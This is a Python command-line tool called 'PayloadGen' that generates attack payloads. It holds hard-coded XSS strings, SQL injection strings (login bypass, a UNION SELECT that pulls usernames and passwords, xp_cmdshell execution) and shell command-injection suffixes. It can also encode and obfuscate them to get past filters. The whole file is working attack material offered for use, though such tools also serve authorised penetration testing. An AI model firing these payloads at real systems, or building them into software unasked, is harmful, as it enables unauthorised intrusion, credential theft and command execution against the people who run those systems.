import argparse
import base64
import urllib.parse
import json
import pyperclip

# Payload definitions
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<body onload=alert(1)>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1' -- ",
    "' UNION SELECT NULL, username, password FROM users -- ",
    "' AND (SELECT SUBSTRING(@@version,1,1))='5",
    "'; EXEC xp_cmdshell('whoami'); --",
    "'/**/UNION/**/SELECT/**/1,2,3--"
]

CMD_PAYLOADS = [
    "; ls -la",
    "&& whoami",
    "| net user",
    "|| echo vulnerable",
    "`id`"
]

ENCODERS = {
    "base64": lambda x: base64.b64encode(x.encode()).decode(),
    "url": lambda x: urllib.parse.quote(x),
    "hex": lambda x: ''.join(['\\x' + format(ord(i), 'x') for i in x]),
    "unicode": lambda x: ''.join(['\\u' + format(ord(i), '04x') for i in x])
}

def obfuscate(payload):
    return payload.replace(' ', '/**/').replace('=', '=%00')

def encode_payload(payload, method):
    return ENCODERS.get(method, lambda x: x)(payload)

def generate_payloads(types, encode=None, obfuscate_flag=False):
    payloads = []
    if types["xss"]:
        payloads.extend(XSS_PAYLOADS)
    if types["sqli"]:
        payloads.extend(SQLI_PAYLOADS)
    if types["cmd"]:
        payloads.extend(CMD_PAYLOADS)

    final = []
    for p in payloads:
        if obfuscate_flag:
            p = obfuscate(p)
        if encode:
            p = encode_payload(p, encode)
        final.append(p)
    return final

def main():
    parser = argparse.ArgumentParser(description="PayloadGen CLI Tool")
    parser.add_argument('--xss', action='store_true')
    parser.add_argument('--sqli', action='store_true')
    parser.add_argument('--cmd', action='store_true')
    parser.add_argument('--encode', choices=['base64', 'url', 'hex', 'unicode'])
    parser.add_argument('--obfuscate', action='store_true')
    parser.add_argument('--json', action='store_true')
    parser.add_argument('--copy', action='store_true')

    args = parser.parse_args()

    types = {"xss": args.xss, "sqli": args.sqli, "cmd": args.cmd}
    payloads = generate_payloads(types, encode=args.encode, obfuscate_flag=args.obfuscate)

    if args.json:
        print(json.dumps(payloads, indent=2))
    else:
        for i, p in enumerate(payloads):
            print(f"[{i + 1}] {p}")

    if args.copy and payloads:
        pyperclip.copy(payloads[0])
        print("\n✅ Copied first payload to clipboard.")

if __name__ == "__main__":
    main()
